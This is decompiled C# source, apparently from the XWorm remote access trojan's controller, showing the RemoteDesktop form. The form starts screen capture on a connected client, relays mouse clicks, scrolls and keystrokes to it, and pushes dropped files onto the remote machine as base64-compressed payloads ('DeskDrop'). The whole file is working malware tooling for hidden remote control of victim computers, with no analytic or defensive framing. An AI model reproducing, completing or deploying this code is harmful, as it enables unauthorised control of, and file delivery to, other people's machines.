using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My.Resources;

namespace XWorm
{
	// Token: 0x02000029 RID: 41
	[DesignerGenerated]
	public partial class RemoteDesktop : Form
	{
		// Token: 0x060007D0 RID: 2000 RVA: 0x00044C58 File Offset: 0x00042E58
		public RemoteDesktop()
		{
			base.Load += this.RemoteDesktop_Load;
			base.Closing += this.RemoteDesktop_Closing;
			base.FormClosing += this.RemoteDesktop_FormClosing;
			this.op = new Point(1, 1);
			this.FPS = 0;
			this.sw = Stopwatch.StartNew();
			this._keysPressed = new List<Keys>();
			this.InitializeComponent();
		}

		// Token: 0x170002E6 RID: 742
		// (get) Token: 0x060007D3 RID: 2003 RVA: 0x00045A6B File Offset: 0x00043C6B
		// (set) Token: 0x060007D4 RID: 2004 RVA: 0x00045A78 File Offset: 0x00043C78
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x170002E7 RID: 743
		// (get) Token: 0x060007D5 RID: 2005 RVA: 0x00045ABB File Offset: 0x00043CBB
		// (set) Token: 0x060007D6 RID: 2006 RVA: 0x00045AC5 File Offset: 0x00043CC5
		internal virtual StatusStrip StatusStrip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E8 RID: 744
		// (get) Token: 0x060007D7 RID: 2007 RVA: 0x00045ACE File Offset: 0x00043CCE
		// (set) Token: 0x060007D8 RID: 2008 RVA: 0x00045AD8 File Offset: 0x00043CD8
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002E9 RID: 745
		// (get) Token: 0x060007D9 RID: 2009 RVA: 0x00045AE1 File Offset: 0x00043CE1
		// (set) Token: 0x060007DA RID: 2010 RVA: 0x00045AEC File Offset: 0x00043CEC
		internal virtual System.Windows.Forms.Timer Timer2
		{
			[CompilerGenerated]
			get
			{
				return this._Timer2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				System.Windows.Forms.Timer timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer2 = value;
				timer = this._Timer2;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x170002EA RID: 746
		// (get) Token: 0x060007DB RID: 2011 RVA: 0x00045B2F File Offset: 0x00043D2F
		// (set) Token: 0x060007DC RID: 2012 RVA: 0x00045B3C File Offset: 0x00043D3C
		internal virtual ToolStripStatusLabel ToolStripStatusLabel2
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripStatusLabel2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel2_Click);
				ToolStripStatusLabel toolStripStatusLabel = this._ToolStripStatusLabel2;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click -= value2;
				}
				this._ToolStripStatusLabel2 = value;
				toolStripStatusLabel = this._ToolStripStatusLabel2;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click += value2;
				}
			}
		}

		// Token: 0x170002EB RID: 747
		// (get) Token: 0x060007DD RID: 2013 RVA: 0x00045B7F File Offset: 0x00043D7F
		// (set) Token: 0x060007DE RID: 2014 RVA: 0x00045B8C File Offset: 0x00043D8C
		internal virtual ToolStripStatusLabel ToolStripStatusLabel3
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripStatusLabel3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel3_Click);
				ToolStripStatusLabel toolStripStatusLabel = this._ToolStripStatusLabel3;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click -= value2;
				}
				this._ToolStripStatusLabel3 = value;
				toolStripStatusLabel = this._ToolStripStatusLabel3;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click += value2;
				}
			}
		}

		// Token: 0x170002EC RID: 748
		// (get) Token: 0x060007DF RID: 2015 RVA: 0x00045BCF File Offset: 0x00043DCF
		// (set) Token: 0x060007E0 RID: 2016 RVA: 0x00045BDC File Offset: 0x00043DDC
		internal virtual ToolStripStatusLabel ToolStripStatusLabel4
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripStatusLabel4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel4_Click);
				ToolStripStatusLabel toolStripStatusLabel = this._ToolStripStatusLabel4;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click -= value2;
				}
				this._ToolStripStatusLabel4 = value;
				toolStripStatusLabel = this._ToolStripStatusLabel4;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click += value2;
				}
			}
		}

		// Token: 0x170002ED RID: 749
		// (get) Token: 0x060007E1 RID: 2017 RVA: 0x00045C1F File Offset: 0x00043E1F
		// (set) Token: 0x060007E2 RID: 2018 RVA: 0x00045C2C File Offset: 0x00043E2C
		internal virtual ToolStripStatusLabel ToolStripStatusLabel5
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripStatusLabel5;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel5_Click);
				ToolStripStatusLabel toolStripStatusLabel = this._ToolStripStatusLabel5;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click -= value2;
				}
				this._ToolStripStatusLabel5 = value;
				toolStripStatusLabel = this._ToolStripStatusLabel5;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click += value2;
				}
			}
		}

		// Token: 0x170002EE RID: 750
		// (get) Token: 0x060007E3 RID: 2019 RVA: 0x00045C6F File Offset: 0x00043E6F
		// (set) Token: 0x060007E4 RID: 2020 RVA: 0x00045C79 File Offset: 0x00043E79
		internal virtual Panel Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002EF RID: 751
		// (get) Token: 0x060007E5 RID: 2021 RVA: 0x00045C82 File Offset: 0x00043E82
		// (set) Token: 0x060007E6 RID: 2022 RVA: 0x00045C8C File Offset: 0x00043E8C
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170002F0 RID: 752
		// (get) Token: 0x060007E7 RID: 2023 RVA: 0x00045CCF File Offset: 0x00043ECF
		// (set) Token: 0x060007E8 RID: 2024 RVA: 0x00045CD9 File Offset: 0x00043ED9
		internal virtual Guna2ComboBox Guna2ComboBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F1 RID: 753
		// (get) Token: 0x060007E9 RID: 2025 RVA: 0x00045CE2 File Offset: 0x00043EE2
		// (set) Token: 0x060007EA RID: 2026 RVA: 0x00045CEC File Offset: 0x00043EEC
		internal virtual PictureBox PictureBox1
		{
			[CompilerGenerated]
			get
			{
				return this._PictureBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PictureBox1_Click);
				MouseEventHandler value3 = new MouseEventHandler(this.PictureBox1_MouseUp);
				MouseEventHandler value4 = new MouseEventHandler(this.PictureBox1_MouseMove);
				MouseEventHandler value5 = new MouseEventHandler(this.PictureBox1_MouseDown);
				KeyEventHandler value6 = new KeyEventHandler(this.PictureBox1_KeyUp);
				KeyEventHandler value7 = new KeyEventHandler(this.PictureBox1_KeyDown);
				DragEventHandler value8 = new DragEventHandler(this.PictureBox1_DragEnter);
				DragEventHandler value9 = new DragEventHandler(this.PictureBox1_DragDrop);
				PictureBox pictureBox = this._PictureBox1;
				if (pictureBox != null)
				{
					pictureBox.Click -= value2;
					pictureBox.MouseUp -= value3;
					pictureBox.MouseMove -= value4;
					pictureBox.MouseDown -= value5;
					pictureBox.KeyUp -= value6;
					pictureBox.KeyDown -= value7;
					pictureBox.DragEnter -= value8;
					pictureBox.DragDrop -= value9;
				}
				this._PictureBox1 = value;
				pictureBox = this._PictureBox1;
				if (pictureBox != null)
				{
					pictureBox.Click += value2;
					pictureBox.MouseUp += value3;
					pictureBox.MouseMove += value4;
					pictureBox.MouseDown += value5;
					pictureBox.KeyUp += value6;
					pictureBox.KeyDown += value7;
					pictureBox.DragEnter += value8;
					pictureBox.DragDrop += value9;
				}
			}
		}

		// Token: 0x170002F2 RID: 754
		// (get) Token: 0x060007EB RID: 2027 RVA: 0x00045E0C File Offset: 0x0004400C
		// (set) Token: 0x060007EC RID: 2028 RVA: 0x00045E16 File Offset: 0x00044016
		internal virtual Guna2Panel Guna2Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F3 RID: 755
		// (get) Token: 0x060007ED RID: 2029 RVA: 0x00045E1F File Offset: 0x0004401F
		// (set) Token: 0x060007EE RID: 2030 RVA: 0x00045E29 File Offset: 0x00044029
		internal virtual Guna2Panel Guna2Panel3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F4 RID: 756
		// (get) Token: 0x060007EF RID: 2031 RVA: 0x00045E32 File Offset: 0x00044032
		// (set) Token: 0x060007F0 RID: 2032 RVA: 0x00045E3C File Offset: 0x0004403C
		internal virtual Guna2Panel Guna2Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F5 RID: 757
		// (get) Token: 0x060007F1 RID: 2033 RVA: 0x00045E45 File Offset: 0x00044045
		// (set) Token: 0x060007F2 RID: 2034 RVA: 0x00045E4F File Offset: 0x0004404F
		internal virtual Guna2ComboBox Guna2ComboBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002F6 RID: 758
		// (get) Token: 0x060007F3 RID: 2035 RVA: 0x00045E58 File Offset: 0x00044058
		// (set) Token: 0x060007F4 RID: 2036 RVA: 0x00045E64 File Offset: 0x00044064
		internal virtual ToolStripStatusLabel ToolStripStatusLabel6
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripStatusLabel6;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel6_Click);
				ToolStripStatusLabel toolStripStatusLabel = this._ToolStripStatusLabel6;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click -= value2;
				}
				this._ToolStripStatusLabel6 = value;
				toolStripStatusLabel = this._ToolStripStatusLabel6;
				if (toolStripStatusLabel != null)
				{
					toolStripStatusLabel.Click += value2;
				}
			}
		}

		// Token: 0x060007F5 RID: 2037 RVA: 0x00045EA8 File Offset: 0x000440A8
		private void RemoteDesktop_Load(object sender, EventArgs e)
		{
			base.MouseWheel += this.MyMouseWheel;
			this._keysPressed = new List<Keys>();
			this.PictureBox1.AllowDrop = true;
			try
			{
				this.Timer2.Start();
				this.Guna2GradientButton1.PerformClick();
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060007F6 RID: 2038 RVA: 0x00045F28 File Offset: 0x00044128
		private void MyMouseWheel(object sender, MouseEventArgs e)
		{
			bool flag = this.ToolStripStatusLabel2.ForeColor == Color.Green;
			if (flag)
			{
				bool flag2 = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
				if (flag2)
				{
					bool flag3 = e.Delta < 0;
					bool flag4 = flag3;
					if (flag4)
					{
						byte[] state = Helper.SB("ScrollDown");
						Client $VB$NonLocal_2 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
					else
					{
						byte[] state2 = Helper.SB("ScrollUp");
						Client $VB$NonLocal_3 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							$VB$NonLocal_3.BeginSend((byte[])a0);
						}, state2);
					}
				}
			}
		}

		// Token: 0x060007F7 RID: 2039 RVA: 0x00045FF1 File Offset: 0x000441F1
		private void RemoteDesktop_Closing(object sender, CancelEventArgs e)
		{
			this.Guna2GradientButton1.Text = "OFF";
		}

		// Token: 0x060007F8 RID: 2040 RVA: 0x00046008 File Offset: 0x00044208
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060007F9 RID: 2041 RVA: 0x00046060 File Offset: 0x00044260
		private void Timer2_Tick(object sender, EventArgs e)
		{
			try
			{
				this.ToolStripStatusLabel1.Text = "Size :" + this.PictureBox1.Width.ToString() + "x" + this.PictureBox1.Height.ToString();
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060007FA RID: 2042 RVA: 0x000460E0 File Offset: 0x000442E0
		private void PictureBox1_Click(object sender, EventArgs e)
		{
			this.PictureBox1.Focus();
		}

		// Token: 0x060007FB RID: 2043 RVA: 0x000460F0 File Offset: 0x000442F0
		private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
		{
			bool flag = this.ToolStripStatusLabel2.ForeColor == Color.Green;
			if (flag)
			{
				bool flag2 = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
				if (flag2)
				{
					Point point = checked(new Point((int)Math.Round(unchecked((double)e.X * ((double)this.Sz.Width / (double)this.PictureBox1.Width))), (int)Math.Round(unchecked((double)e.Y * ((double)this.Sz.Height / (double)this.PictureBox1.Height)))));
					bool flag3 = e.Button == MouseButtons.Left;
					int value;
					if (flag3)
					{
						value = 4;
					}
					bool flag4 = e.Button == MouseButtons.Right;
					if (flag4)
					{
						value = 16;
					}
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"Click",
						SettingsHelper.SPL,
						Conversions.ToString(point.X),
						SettingsHelper.SPL,
						Conversions.ToString(point.Y),
						SettingsHelper.SPL,
						Conversions.ToString(value)
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
		}

		// Token: 0x060007FC RID: 2044 RVA: 0x00046244 File Offset: 0x00044444
		private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
		{
			bool flag = this.ToolStripStatusLabel2.ForeColor == Color.Green & this.ToolStripStatusLabel6.ForeColor == Color.Green;
			if (flag)
			{
				bool flag2 = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
				if (flag2)
				{
					Point left = checked(new Point((int)Math.Round(unchecked((double)e.X * ((double)this.Sz.Width / (double)this.PictureBox1.Width))), (int)Math.Round(unchecked((double)e.Y * ((double)this.Sz.Height / (double)this.PictureBox1.Height)))));
					bool flag3 = left != this.op;
					if (flag3)
					{
						this.op = left;
					}
				}
			}
		}

		// Token: 0x060007FD RID: 2045 RVA: 0x00046314 File Offset: 0x00044514
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			bool flag = this.ToolStripStatusLabel2.ForeColor == Color.Green;
			if (flag)
			{
				bool flag2 = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
				if (flag2)
				{
					Point point = checked(new Point((int)Math.Round(unchecked((double)e.X * ((double)this.Sz.Width / (double)this.PictureBox1.Width))), (int)Math.Round(unchecked((double)e.Y * ((double)this.Sz.Height / (double)this.PictureBox1.Height)))));
					bool flag3 = e.Button == MouseButtons.Left;
					int value;
					if (flag3)
					{
						value = 2;
					}
					bool flag4 = e.Button == MouseButtons.Right;
					if (flag4)
					{
						value = 8;
					}
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"Click",
						SettingsHelper.SPL,
						Conversions.ToString(point.X),
						SettingsHelper.SPL,
						Conversions.ToString(point.Y),
						SettingsHelper.SPL,
						Conversions.ToString(value)
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
		}

		// Token: 0x060007FE RID: 2046 RVA: 0x00046468 File Offset: 0x00044668
		private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
		{
			bool flag = this.ToolStripStatusLabel2.ForeColor == Color.Green;
			if (flag)
			{
				this.ToolStripStatusLabel2.ForeColor = Color.Black;
				this.ToolStripStatusLabel6.ForeColor = Color.Black;
			}
			else
			{
				this.ToolStripStatusLabel2.ForeColor = Color.Green;
			}
		}

		// Token: 0x060007FF RID: 2047 RVA: 0x000464C8 File Offset: 0x000446C8
		private void ToolStripStatusLabel3_Click(object sender, EventArgs e)
		{
			bool flag = this.ToolStripStatusLabel3.ForeColor == Color.Green;
			if (flag)
			{
				this.ToolStripStatusLabel3.ForeColor = Color.Black;
			}
			else
			{
				this.PictureBox1.Focus();
				this.ToolStripStatusLabel3.ForeColor = Color.Green;
			}
		}

		// Token: 0x06000800 RID: 2048 RVA: 0x00046524 File Offset: 0x00044724
		private bool IsLockKey(Keys key)
		{
			return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
		}

		// Token: 0x06000801 RID: 2049 RVA: 0x00046560 File Offset: 0x00044760
		private void PictureBox1_KeyUp(object sender, KeyEventArgs e)
		{
			bool flag = this.ToolStripStatusLabel3.ForeColor == Color.Green;
			if (flag)
			{
				bool flag2 = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
				if (flag2)
				{
					bool flag3 = !this.IsLockKey(e.KeyCode);
					if (flag3)
					{
						e.Handled = true;
					}
					this._keysPressed.Remove(e.KeyCode);
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"Key",
						SettingsHelper.SPL,
						Conversions.ToString((int)e.KeyCode),
						SettingsHelper.SPL,
						"False"
					}));
					Client $VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
		}

		// Token: 0x06000802 RID: 2050 RVA: 0x00046644 File Offset: 0x00044844
		private void PictureBox1_KeyDown(object sender, KeyEventArgs e)
		{
			bool flag = this.ToolStripStatusLabel3.ForeColor == Color.Green;
			if (flag)
			{
				bool flag2 = Operators.CompareString(this.Guna2GradientButton1.Text, "Capturing...", false) == 0;
				if (flag2)
				{
					bool flag3 = !this.IsLockKey(e.KeyCode);
					if (flag3)
					{
						e.Handled = true;
					}
					bool flag4 = this._keysPressed.Contains(e.KeyCode);
					if (!flag4)
					{
						this._keysPressed.Add(e.KeyCode);
						byte[] state = Helper.SB(string.Concat(new string[]
						{
							"Key",
							SettingsHelper.SPL,
							Conversions.ToString((int)e.KeyCode),
							SettingsHelper.SPL,
							"True"
						}));
						Client $VB$NonLocal_2 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
			}
		}

		// Token: 0x06000803 RID: 2051 RVA: 0x00046740 File Offset: 0x00044940
		private void ToolStripStatusLabel4_Click(object sender, EventArgs e)
		{
			bool flag = this.ToolStripStatusLabel4.ForeColor == Color.Green;
			if (flag)
			{
				this.ToolStripStatusLabel4.ForeColor = Color.Black;
			}
			else
			{
				try
				{
					string text = Path.Combine(Application.StartupPath, "ClientsFolder", this.CID, "Monitor");
					bool flag2 = !Directory.Exists(text);
					if (flag2)
					{
						Directory.CreateDirectory(text);
					}
					Process.Start(text);
					this.ToolStripStatusLabel4.ForeColor = Color.Green;
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000804 RID: 2052 RVA: 0x000467F8 File Offset: 0x000449F8
		private void RemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
		{
			byte[] state = Helper.SB("CloseScreen");
			Client $VB$NonLocal_2 = this.C;
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				$VB$NonLocal_2.BeginSend((byte[])a0);
			}, state);
		}

		// Token: 0x06000805 RID: 2053 RVA: 0x00046838 File Offset: 0x00044A38
		private void ToolStripStatusLabel5_Click(object sender, EventArgs e)
		{
			bool flag = this.ToolStripStatusLabel5.ForeColor == Color.Green;
			if (flag)
			{
				this.ToolStripStatusLabel5.ForeColor = Color.Black;
				this.ToolStripStatusLabel2.Visible = true;
				this.ToolStripStatusLabel6.Visible = true;
				this.ToolStripStatusLabel3.Visible = true;
			}
			else
			{
				this.ToolStripStatusLabel5.ForeColor = Color.Green;
				this.ToolStripStatusLabel2.ForeColor = Color.Black;
				this.ToolStripStatusLabel6.ForeColor = Color.Black;
				this.ToolStripStatusLabel3.ForeColor = Color.Black;
				this.ToolStripStatusLabel2.Visible = false;
				this.ToolStripStatusLabel6.Visible = false;
				this.ToolStripStatusLabel3.Visible = false;
			}
		}

		// Token: 0x06000806 RID: 2054 RVA: 0x00046908 File Offset: 0x00044B08
		private void PictureBox1_DragEnter(object sender, DragEventArgs e)
		{
			bool dataPresent = e.Data.GetDataPresent(DataFormats.FileDrop);
			if (dataPresent)
			{
				e.Effect = DragDropEffects.Copy;
			}
		}

		// Token: 0x06000807 RID: 2055 RVA: 0x00046934 File Offset: 0x00044B34
		private void PictureBox1_DragDrop(object sender, DragEventArgs e)
		{
			string[] array = (string[])e.Data.GetData(DataFormats.FileDrop);
			foreach (string path in array)
			{
				bool flag = File.Exists(path);
				if (flag)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"DeskDrop",
						SettingsHelper.SPL,
						Path.GetFileName(path),
						SettingsHelper.SPL,
						Convert.ToBase64String(Helper.Compress(File.ReadAllBytes(path)))
					}));
					RemoteDesktop._Closure$__R97-14 CS$<>8__locals1 = new RemoteDesktop._Closure$__R97-14(CS$<>8__locals1);
					CS$<>8__locals1.$VB$NonLocal_2 = this.C;
					ThreadPool.QueueUserWorkItem(delegate(object a0)
					{
						CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
					}, state);
				}
			}
		}

		// Token: 0x06000808 RID: 2056 RVA: 0x000469F8 File Offset: 0x00044BF8
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Guna2GradientButton1.Text, "OFF", false) == 0;
			if (flag)
			{
				this.Guna2GradientButton1.Text = "Capturing...";
				this.Guna2GradientButton1.Image = Resources._Stop;
				byte[] state = Helper.SB(string.Concat(new string[]
				{
					"RD+",
					SettingsHelper.SPL,
					this.PictureBox1.Width.ToString(),
					SettingsHelper.SPL,
					this.PictureBox1.Height.ToString(),
					SettingsHelper.SPL,
					this.Guna2ComboBox1.Text.Replace("%", "").ToString(),
					SettingsHelper.SPL,
					this.Guna2ComboBox2.SelectedIndex.ToString()
				}));
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
			}
			else
			{
				this.Guna2GradientButton1.Text = "OFF";
				this.Guna2GradientButton1.Image = Resources.Play;
			}
		}

		// Token: 0x06000809 RID: 2057 RVA: 0x00046B34 File Offset: 0x00044D34
		private void ToolStripStatusLabel6_Click(object sender, EventArgs e)
		{
			bool flag = this.ToolStripStatusLabel6.ForeColor == Color.Green;
			if (flag)
			{
				this.ToolStripStatusLabel6.ForeColor = Color.Black;
			}
			else
			{
				bool flag2 = this.ToolStripStatusLabel2.ForeColor == Color.Green;
				if (flag2)
				{
					this.ToolStripStatusLabel6.ForeColor = Color.Green;
				}
			}
		}

		// Token: 0x04000349 RID: 841
		public Client C;

		// Token: 0x0400034A RID: 842
		public string CID;

		// Token: 0x0400034B RID: 843
		public Size Sz;

		// Token: 0x0400034C RID: 844
		public Point op;

		// Token: 0x0400034D RID: 845
		public int FPS;

		// Token: 0x0400034E RID: 846
		public Stopwatch sw;

		// Token: 0x0400034F RID: 847
		public List<Keys> _keysPressed;
	}
}
